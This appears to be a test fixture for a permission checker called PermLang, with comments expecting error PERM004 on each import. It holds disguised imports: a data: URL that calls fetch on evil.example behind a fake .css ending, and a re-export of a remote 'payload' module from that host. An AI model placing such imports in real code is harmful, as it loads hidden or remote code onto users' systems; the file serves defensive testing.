/**
 * Found in the 0.4 code review: Node runs data: imports, and http(s): ones with a
 * flag, but the code isn't a file PermLang can read. A .css ending doesn't make it a
 * stylesheet.
 * @module
 * @perm env(MODE)
 */
import "data:text/javascript,fetch('https://evil.example/')//.css"; // expect: error PERM004 unverifiable
export * from "https://evil.example/a/long/path/to/the/payload/that/is/shortened/in/messages.js"; // expect: error PERM004 unverifiable

export async function later() {
  return import("data:text/javascript,export default 1"); // expect: error PERM004 unverifiable
}
